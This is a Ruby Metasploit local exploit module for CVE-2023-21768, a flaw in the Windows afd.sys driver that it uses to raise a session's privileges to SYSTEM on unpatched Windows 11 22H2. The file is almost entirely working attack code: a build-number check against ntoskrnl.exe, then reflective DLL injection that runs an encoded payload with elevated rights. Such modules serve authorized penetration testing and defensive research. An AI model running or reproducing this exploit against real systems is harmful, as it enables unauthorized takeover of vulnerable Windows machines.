##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Msf::Post::Windows::Priv
  include Msf::Post::Windows::Process
  include Msf::Post::Windows::ReflectiveDLLInjection
  include Msf::Post::Windows::FileInfo
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        {
          'Name' => 'Ancillary Function Driver (AFD) for WinSock Elevation of Privilege',
          'Description' => %q{
            A vulnerability exists in the Windows Ancillary Function Driver for Winsock
            (`afd.sys`) can be leveraged by an attacker to escalate privileges to those of
            NT AUTHORITY\SYSTEM. Due to a flaw in `AfdNotifyRemoveIoCompletion`, it is
            possible to create an arbitrary kernel Write-Where primitive, which can be used
            to manipulate internal I/O ring structures and achieve local privilege
            escalation.

            This exploit only supports Windows 11 22H2 up to build 22621.963 (patched in
            January 2023 updates).
          },
          'License' => MSF_LICENSE,
          'Author' => [
            'chompie', # Github PoC
            'b33f', # Github PoC
            'Yarden Shafir', # I/O Ring R/W primitive PoC
            'Christophe De La Fuente' # Metasploit module
          ],
          'Arch' => [ ARCH_X64 ],
          'Platform' => 'win',
          'SessionTypes' => [ 'meterpreter' ],
          'Privileged' => true,
          'Targets' => [
            [ 'Windows 11 22H2 x64', { 'Arch' => ARCH_X64 } ]
          ],
          'Payload' => {
            'DisableNops' => true
          },
          'References' => [
            [ 'CVE', '2023-21768' ],
            [ 'URL', 'https://github.com/xforcered/Windows_LPE_AFD_CVE-2023-21768' ],
            [ 'URL', 'https://github.com/yardenshafir/IoRingReadWritePrimitive' ]
          ],
          'DisclosureDate' => '2023-01-10',
          'DefaultTarget' => 0,
          'Notes' => {
            'Stability' => [ CRASH_SAFE ],
            'Reliability' => [ REPEATABLE_SESSION ],
            'SideEffects' => []
          }
        }
      )
    )
  end

  def check
    unless session.platform == 'windows'
      return Exploit::CheckCode::Safe('Only Windows systems are affected')
    end

    major, minor, build, revision, _branch = file_version('C:\\Windows\\System32\\ntoskrnl.exe')
    vprint_status("Windows Build Number = #{build}.#{revision}")

    unless major == 6 && minor == 2 && build == 22621
      return CheckCode::Safe('The exploit only supports Windows 11 22H2')
    end

    if revision > 963
      return CheckCode::Safe("This Windows host seems to be patched (build 22621.#{revision})")
    end

    CheckCode::Appears
  end

  def exploit
    if is_system?
      fail_with(Failure::None, 'Session is already elevated')
    end

    if sysinfo['Architecture'] == ARCH_X64 && session.arch == ARCH_X86
      fail_with(Failure::NoTarget, 'Running against WOW64 is not supported')
    end

    encoded_payload = payload.encoded
    execute_dll(
      ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2023-21768', 'CVE-2023-21768.x64.dll'),
      [encoded_payload.length].pack('I<') + encoded_payload
    )

    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')
  end
end
